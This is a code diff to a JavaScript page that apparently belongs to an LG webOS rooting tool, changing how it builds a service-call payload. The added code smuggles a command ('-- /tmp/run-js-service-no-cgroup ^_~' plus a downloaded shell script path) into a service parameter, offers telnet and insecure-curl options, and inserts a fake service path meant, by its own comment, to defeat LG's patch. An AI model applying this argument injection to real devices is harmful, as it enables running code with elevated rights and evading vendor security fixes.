@@ -61,7 +61,7 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                 var rawScript = getQueryParam('script');
 
                 if (rawScript === null) {
-                    // XXX: This should be an error
+                    // XXX: This should be an error: script required
                     return '';
                 }
 
@@ -72,11 +72,27 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                 var rawFiles = getQueryParam('files');
 
                 if (rawFiles === null) {
-                    // XXX: This should be an error
+                    // XXX: This should be an error: files required
                     return [];
                 }
 
                 return rawFiles.split(';');
+            })();
+
+            var fakeServicePath = (function () {
+                var rawFakePath = getQueryParam('fake-service-path');
+
+                if (rawFakePath === null) {
+                    // The query parameter was not provided; fine
+                    return null;
+                }
+
+                if ((typeof rawFakePath !== 'string') || (rawFakePath.length === 0)) {
+                    // XXX: Should be an error: must be a non-empty string
+                    return null;
+                }
+
+                return rawFakePath;
             })();
 
             var statusElem = document.getElementById('status');
@@ -209,16 +225,19 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                     return;
                 }
 
-                var args = [];
+                var shellScriptPath = downloadDir + '/' + shellScriptName;
+                var args = ['--', '/tmp/run-js-service-no-cgroup', '^_~', downloadDir, shellScriptPath];
+                if (fakeServicePath !== null) {
+                    // Straightforward way to get the fake service path into position to fool LG's patch attempt
+                    args.unshift('a', 'b', 'c', fakeServicePath);
+                }
+
+                // Add option flags at the end of the argument list
                 if (optTelnet) args.push('--telnet');
                 if (optDebug) args.push('--debug');
                 if (optCurlInsecure) args.push('--curl-insecure');
 
-                var shellScriptPath = downloadDir + '/' + shellScriptName;
-
-                var requestPayload = {
-                    inputParams: '-- /tmp/run-js-service-no-cgroup ^_~ ' + downloadDir + ' ' + shellScriptPath + ' ' + args.join(' ')
-                };
+                var requestPayload = { inputParams: args.join(' ') };
                 logDebug('request payload: ' + JSON.stringify(requestPayload));
 
                 bridge.onservicecallback = function (message) {
